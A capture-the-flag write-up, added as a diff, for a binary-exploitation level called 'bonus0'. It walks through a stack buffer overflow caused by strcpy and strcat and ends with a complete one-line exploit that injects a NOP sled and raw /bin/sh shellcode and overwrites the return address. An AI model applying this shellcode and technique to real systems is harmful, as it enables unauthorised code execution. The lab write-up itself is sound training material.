@@ -1,0 +1,46 @@
+In this level we have a pp function inside the main, and a p function inside the
+pp one.
+
+We are asked 2 input, the first one is a big buffer, the second one is smaller.
+
+We will target the return address of the main to redirect it to our shellcode in
+a buffer.
+
+The main is 58 bytes long and we need to build something that puts our exploit
+on the 54th bytes like:  main - ret address (4) = 58 - 4 = 54
+
+We will give the first buffer a 20 char length string and the second one a 14
+char + shellcode address + 1 char so 19
+
+After the first strcpy we have a 39 char legnth string, then the 
+
+dest[strlen(dest)] = ' ';  appends 1 space character so we have 40 chars now and
+the strcat appends again the second str
+
+so finally a 59 char string
+
+We now put a lot of NOPs after the 20 characters of the first buffer and then
+the shellcode, so we will overwrite the main address with an address that points
+in the NOP sea.
+
+so our exploit will look like :
+
+1st string : (20 chars + lot of NOPs + shellcode)
+
+2nd string : (14 chars + address of buffer + 1 char)
+
+Like this, the address of the buffer is written at the 54th byte and will
+overwrite the main ret address.
+
+We now find the buffer address :
+
+0xbffff680:	0xbffff6bf	0xbffff6be	0x61616161	0x61616161
+
+We found our a's :) We add 20 to this address + 100 NOPs and we will give 200
+NOPs to the exploit so we're sure we are in the range.
+
+Lets build it :
+
+(python -c 'print("a" * 20 + "\x90" * 200 +"\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80")';python -c 'print("a" * 14 + "\xf8\xe6\xff\xbf" + "a")'; cat) | ./bonus0
+
+And we have the flag !
